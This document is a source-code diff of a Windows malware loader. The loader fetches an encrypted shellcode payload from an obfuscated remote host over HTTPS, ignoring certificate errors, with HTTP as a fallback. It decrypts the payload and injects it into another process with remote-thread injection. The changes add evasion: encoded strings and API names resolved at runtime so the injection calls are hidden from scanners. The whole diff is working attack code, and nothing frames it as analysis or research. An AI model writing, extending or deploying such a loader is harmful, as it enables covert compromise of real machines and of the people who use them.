@@ -12,7 +12,8 @@ struct Shellcode {
 };
 
 DWORD GetTargetPID();
-BOOL Download(LPCWSTR host, INTERNET_PORT port, BOOL bSecure, Shellcode* shellcode);
+BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
+BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
 BOOL Inject(DWORD dwPID, Shellcode shellcode);
 
 wchar_t* deobf_int_array(const int* arr, size_t len, int const_val) {
@@ -28,9 +29,7 @@ long parse_val(const wchar_t* s) {
     if (wcsncmp(s, L"&H", 2) == 0) {
         return wcstol(s + 2, NULL, 16);
     }
-    else {
-        return wcstol(s, NULL, 10);
-    }
+    return wcstol(s, NULL, 10);
 }
 
 void rc4(unsigned char* key, size_t keylen, unsigned char* data, size_t datalen) {
@@ -73,10 +72,12 @@ int main() {
     LPCWSTR host = deobf_int_array(host_arr, sizeof(host_arr) / sizeof(int), 44536);
 
     struct Shellcode shellcode;
-    if (!Download(host, 443, FALSE, &shellcode)) {
-        OutputDebugString(L"[-] Download failed\n");
-        delete[] host;
-        return 2;
+    if (!DownloadHTTPS(host, 443, &shellcode)) {
+        if (!Download(host, 80, &shellcode)) {
+            OutputDebugString(L"[-] Both HTTPS and HTTP downloads failed\n");
+            delete[] host;
+            return 2;
+        }
     }
 
     delete[] host;
@@ -89,7 +90,139 @@ int main() {
     return 0;
 }
 
-BOOL Download(LPCWSTR host, INTERNET_PORT port, BOOL bSecure, Shellcode* shellcode) {
+BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
+    unsigned char ua_enc[] = { 0x1B, 0x66, 0xEA, 0x6E, 0x0E, 0x44, 0xD4, 0x66, 0xE6, 0xD0, 0x8B, 0x98, 0x3D, 0x0C, 0xFF, 0xC5, 0xF4, 0xBF, 0x35, 0xD3, 0xCE, 0xBC, 0x0A, 0x26, 0x0F, 0x51, 0x92, 0x2F, 0x75, 0x9C, 0xFA, 0x73, 0x0E, 0x8A, 0x61, 0xC0, 0xB5, 0xD9, 0x9A, 0x88, 0x90, 0x21, 0xA2, 0x61, 0x38, 0xDD, 0xDA, 0x41, 0x1A, 0x5C, 0x52, 0xDA, 0x54, 0x55, 0xD2, 0xF0, 0x15, 0x3C, 0x78, 0xCD, 0xCC, 0xEE, 0xD1, 0x79, 0xF9, 0x38, 0x6F, 0xBA, 0xF4, 0xC2, 0x89, 0x4E, 0xD3, 0x24, 0x8B, 0x91, 0x01, 0xA3, 0x7D, 0xC5, 0xE0, 0xAD, 0x79, 0x4F, 0x1F, 0x0B, 0x10, 0x39, 0x30, 0x85, 0x6A, 0xAE, 0x85, 0x91, 0x0A, 0x98, 0x72, 0x1B, 0x5B, 0x89, 0xCF, 0xA6, 0xD4, 0x13, 0xF2, 0xB8, 0xD2, 0xC1, 0xEC, 0x1D, 0x65, 0xB7, 0xF4, 0x31, 0xDC, 0x07, 0x39, 0x8E, 0x88, 0x8C, 0xA5, 0xC6, 0x10, 0x9C, 0xAF, 0xA3, 0x3D, 0x9B, 0xD1, 0xF6, 0xA6, 0x51, 0xB4, 0x12, 0xC2, 0x35, 0x6F, 0xAB, 0xD3, 0xEC, 0x19, 0x79, 0x84, 0x20, 0x87, 0x64, 0xC5, 0xF9, 0x8B, 0xA3, 0xB1, 0x57, 0x83, 0xFD, 0x97, 0xCD, 0x92, 0x40, 0xC0, 0x8E, 0xFC, 0xBE, 0xE8, 0x07, 0xD1, 0x94, 0x07, 0x5F, 0x1F, 0x0F, 0x53, 0x3C, 0x61, 0x1D, 0x4B, 0x5F, 0xDD, 0x3B, 0x9E, 0xED, 0x50, 0x08, 0xBE, 0xDE, 0x29, 0xF2, 0x23, 0x70, 0xE3, 0xF7, 0x0D, 0x6E, 0xAC, 0xBE, 0x07, 0xDF, 0xF3, 0xDB, 0xD9, 0x1B, 0xE4, 0xB8, 0xC6, 0x10, 0xFF, 0xE8, 0x06, 0xC2, 0x8F, 0x9B, 0x22, 0x14, 0x40, 0xFA, 0xDC, 0xD7, 0x42, 0x8B, 0xBF, 0xC1, 0x11, 0xBA };
+    size_t ua_len = 222;
+    unsigned char* ua_data = new unsigned char[ua_len];
+    memcpy(ua_data, ua_enc, ua_len);
+    rc4((unsigned char*)"mykey", 5, ua_data, ua_len);
+    LPCWSTR ua = (LPCWSTR)ua_data;
+
+    HINTERNET session = InternetOpen(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    delete[] ua_data;
+    if (!session) {
+        OutputDebugString(L"[-] InternetOpen failed\n");
+        return 0;
+    }
+
+    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 0);
+    if (!connection) {
+        OutputDebugString(L"[-] InternetConnect failed\n");
+        InternetCloseHandle(session);
+        return 0;
+    }
+
+    int method_arr[] = { 44639, 44637, 44652 };
+    LPCWSTR method = deobf_int_array(method_arr, sizeof(method_arr) / sizeof(int), 44536);
+
+    wchar_t path[10];
+    path[0] = 200 - (wchar_t)parse_val(L"&H99");
+    path[1] = 200 - (wchar_t)parse_val(L"&H54");
+    path[2] = 200 - (wchar_t)parse_val(L"&H63");
+    path[3] = 200 - (wchar_t)parse_val(L"&H55");
+    path[4] = 200 - (wchar_t)parse_val(L"&H54");
+    path[5] = 200 - (wchar_t)parse_val(L"&H9A");
+    path[6] = 200 - (wchar_t)parse_val(L"&H54");
+    path[7] = 200 - (wchar_t)parse_val(L"&H54");
+    path[8] = 200 - (wchar_t)parse_val(L"&H62");
+    path[9] = 0;
+
+    HINTERNET request = HttpOpenRequest(connection, method, path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
+    delete[] method;
+    if (!request) {
+        OutputDebugString(L"[-] HttpOpenRequest failed\n");
+        InternetCloseHandle(connection);
+        InternetCloseHandle(session);
+        return 0;
+    }
+
+    WORD counter = 0;
+    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
+        counter++;
+        Sleep(3000);
+        if (counter >= 3) {
+            OutputDebugString(L"[-] HttpSendRequest failed after retries\n");
+            InternetCloseHandle(request);
+            InternetCloseHandle(connection);
+            InternetCloseHandle(session);
+            return 0;
+        }
+    }
+
+    DWORD bufSize = BUFSIZ;
+    BYTE* buffer = new BYTE[bufSize];
+    DWORD capacity = bufSize;
+    BYTE* payload = (BYTE*)malloc(capacity);
+    DWORD payloadSize = 0;
+
+    while (true) {
+        DWORD bytesRead;
+        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
+            OutputDebugString(L"[-] InternetReadFile failed\n");
+            free(payload);
+            delete[] buffer;
+            InternetCloseHandle(request);
+            InternetCloseHandle(connection);
+            InternetCloseHandle(session);
+            return 0;
+        }
+
+        if (bytesRead == 0) break;
+
+        if (payloadSize + bytesRead > capacity) {
+            capacity *= 2;
+            BYTE* newPayload = (BYTE*)realloc(payload, capacity);
+            if (newPayload == NULL) {
+                OutputDebugString(L"[-] realloc failed\n");
+                free(payload);
+                delete[] buffer;
+                InternetCloseHandle(request);
+                InternetCloseHandle(connection);
+                InternetCloseHandle(session);
+                return 0;
+            }
+            payload = newPayload;
+        }
+
+        for (DWORD i = 0; i < bytesRead; i++) {
+            payload[payloadSize++] = buffer[i];
+        }
+    }
+
+    BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
+    if (newPayload == NULL) {
+        OutputDebugString(L"[-] Final realloc failed\n");
+        free(payload);
+        delete[] buffer;
+        InternetCloseHandle(request);
+        InternetCloseHandle(connection);
+        InternetCloseHandle(session);
+        return 0;
+    }
+    payload = newPayload;
+
+    // Obfuscation: Apply constant subtraction and RC4
+    int const_sub = 44536 % 256;
+    for (DWORD i = 0; i < payloadSize; i++) {
+        payload[i] = (BYTE)((DWORD)payload[i] - const_sub);
+    }
+    rc4((unsigned char*)"payloadkey", 10, payload, payloadSize);
+
+    // Additional Obfuscation: XOR with a dynamic key
+    BYTE xor_key = (BYTE)(payloadSize % 256);
+    xor_obfuscate(payload, payloadSize, xor_key);
+
+    InternetCloseHandle(request);
+    InternetCloseHandle(connection);
+    InternetCloseHandle(session);
+    delete[] buffer;
+
+    (*shellcode).pcData = payload;
+    (*shellcode).dwSize = payloadSize;
+    return 1;
+}
+
+BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
     unsigned char ua_enc[] = { 0x1B, 0x66, 0xEA, 0x6E, 0x0E, 0x44, 0xD4, 0x66, 0xE6, 0xD0, 0x8B, 0x98, 0x3D, 0x0C, 0xFF, 0xC5, 0xF4, 0xBF, 0x35, 0xD3, 0xCE, 0xBC, 0x0A, 0x26, 0x0F, 0x51, 0x92, 0x2F, 0x75, 0x9C, 0xFA, 0x73, 0x0E, 0x8A, 0x61, 0xC0, 0xB5, 0xD9, 0x9A, 0x88, 0x90, 0x21, 0xA2, 0x61, 0x38, 0xDD, 0xDA, 0x41, 0x1A, 0x5C, 0x52, 0xDA, 0x54, 0x55, 0xD2, 0xF0, 0x15, 0x3C, 0x78, 0xCD, 0xCC, 0xEE, 0xD1, 0x79, 0xF9, 0x38, 0x6F, 0xBA, 0xF4, 0xC2, 0x89, 0x4E, 0xD3, 0x24, 0x8B, 0x91, 0x01, 0xA3, 0x7D, 0xC5, 0xE0, 0xAD, 0x79, 0x4F, 0x1F, 0x0B, 0x10, 0x39, 0x30, 0x85, 0x6A, 0xAE, 0x85, 0x91, 0x0A, 0x98, 0x72, 0x1B, 0x5B, 0x89, 0xCF, 0xA6, 0xD4, 0x13, 0xF2, 0xB8, 0xD2, 0xC1, 0xEC, 0x1D, 0x65, 0xB7, 0xF4, 0x31, 0xDC, 0x07, 0x39, 0x8E, 0x88, 0x8C, 0xA5, 0xC6, 0x10, 0x9C, 0xAF, 0xA3, 0x3D, 0x9B, 0xD1, 0xF6, 0xA6, 0x51, 0xB4, 0x12, 0xC2, 0x35, 0x6F, 0xAB, 0xD3, 0xEC, 0x19, 0x79, 0x84, 0x20, 0x87, 0x64, 0xC5, 0xF9, 0x8B, 0xA3, 0xB1, 0x57, 0x83, 0xFD, 0x97, 0xCD, 0x92, 0x40, 0xC0, 0x8E, 0xFC, 0xBE, 0xE8, 0x07, 0xD1, 0x94, 0x07, 0x5F, 0x1F, 0x0F, 0x53, 0x3C, 0x61, 0x1D, 0x4B, 0x5F, 0xDD, 0x3B, 0x9E, 0xED, 0x50, 0x08, 0xBE, 0xDE, 0x29, 0xF2, 0x23, 0x70, 0xE3, 0xF7, 0x0D, 0x6E, 0xAC, 0xBE, 0x07, 0xDF, 0xF3, 0xDB, 0xD9, 0x1B, 0xE4, 0xB8, 0xC6, 0x10, 0xFF, 0xE8, 0x06, 0xC2, 0x8F, 0x9B, 0x22, 0x14, 0x40, 0xFA, 0xDC, 0xD7, 0x42, 0x8B, 0xBF, 0xC1, 0x11, 0xBA };
     size_t ua_len = 222;
     unsigned char* ua_data = new unsigned char[ua_len];
@@ -111,24 +244,15 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, BOOL bSecure, Shellcode* shellco
         return 0;
     }
 
-    DWORD dwFlags = bSecure ? INTERNET_FLAG_SECURE : 0;
-    wchar_t path[10];
-    path[0] = 200 - (wchar_t)parse_val(L"&H99");
-    path[1] = 200 - (wchar_t)parse_val(L"&H54");
-    path[2] = 200 - (wchar_t)parse_val(L"&H63");
-    path[3] = 200 - (wchar_t)parse_val(L"&H55");
-    path[4] = 200 - (wchar_t)parse_val(L"&H54");
-    path[5] = 200 - (wchar_t)parse_val(L"&H9A");
-    path[6] = 200 - (wchar_t)parse_val(L"&H54");
-    path[7] = 200 - (wchar_t)parse_val(L"&H54");
-    path[8] = 200 - (wchar_t)parse_val(L"&H62");
-    path[9] = 0;
-
     int method_arr[] = { 44639, 44637, 44652 };
     LPCWSTR method = deobf_int_array(method_arr, sizeof(method_arr) / sizeof(int), 44536);
 
-    HINTERNET request = HttpOpenRequest(connection, method, path, NULL, NULL, NULL, dwFlags, 0);
+    int path_arr[] = { 44657, 44633, 44639, 44646, 44647, 44656, 44656, 44656, 44654, 44637, 44646, 44647, 44645, 44582, 44655, 44647, 44638, 44638 };
+    LPCWSTR path = deobf_int_array(path_arr, sizeof(path_arr) / sizeof(int), 44536);
+
+    HINTERNET request = HttpOpenRequest(connection, method, path, NULL, NULL, NULL, 0, 0);
     delete[] method;
+    delete[] path;
     if (!request) {
         OutputDebugString(L"[-] HttpOpenRequest failed\n");
         InternetCloseHandle(connection);
@@ -281,16 +405,24 @@ DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
 }
 
 BOOL Inject(DWORD dwPID, Shellcode shellcode) {
-    // Reverse obfuscation: XOR and RC4
+    // Reverse obfuscation: XOR, RC4, and constant subtraction
     BYTE xor_key = (BYTE)(shellcode.dwSize % 256);
     xor_obfuscate(shellcode.pcData, shellcode.dwSize, xor_key);
     rc4((unsigned char*)"payloadkey", 10, shellcode.pcData, shellcode.dwSize);
-
-    // Reverse constant subtraction
     int const_sub = 44536 % 256;
     for (DWORD i = 0; i < shellcode.dwSize; i++) {
         shellcode.pcData[i] = (BYTE)((DWORD)shellcode.pcData[i] + const_sub);
     }
+
+    // Dynamic API resolution
+    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
+    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+    typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+
+    pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, deobf_int_array((int[]){ 44654, 44641, 44650, 44652, 44653, 44633, 44644, 44644, 44647, 44635, 44637, 44656, 44581, 44656 }, 14, 44536));
+    pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, deobf_int_array((int[]){ 44655, 44650, 44641, 44652, 44637, 44648, 44650, 44647, 44635, 44637, 44651, 44651, 44645, 44637, 44645, 44647, 44650, 44657 }, 18, 44536));
+    pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, deobf_int_array((int[]){ 44635, 44650, 44637, 44633, 44652, 44637, 44650, 44637, 44645, 44647, 44652, 44637, 44652, 44644, 44650, 44637, 44633, 44636 }, 18, 44536));
 
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
     if (!hProcess) {
@@ -300,7 +432,7 @@ BOOL Inject(DWORD dwPID, Shellcode shellcode) {
         return 0;
     }
 
-    LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID pRemoteAddr = fnVirtualAllocEx(hProcess, NULL, shellcode.dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (!pRemoteAddr) {
         wchar_t debugMsg[256];
         swprintf(debugMsg, 256, L"[-] VirtualAllocEx failed: %d\n", GetLastError());
@@ -310,7 +442,7 @@ BOOL Inject(DWORD dwPID, Shellcode shellcode) {
     }
 
     SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, &bytesWritten) || bytesWritten != shellcode.dwSize) {
+    if (!fnWriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, &bytesWritten) || bytesWritten != shellcode.dwSize) {
         wchar_t debugMsg[256];
         swprintf(debugMsg, 256, L"[-] WriteProcessMemory failed: %d, Bytes Written: %zu\n", GetLastError(), bytesWritten);
         OutputDebugString(debugMsg);
@@ -319,7 +451,7 @@ BOOL Inject(DWORD dwPID, Shellcode shellcode) {
         return 0;
     }
 
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
+    HANDLE hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
     if (!hThread) {
         wchar_t debugMsg[256];
         swprintf(debugMsg, 256, L"[-] CreateRemoteThread failed: %d\n", GetLastError());
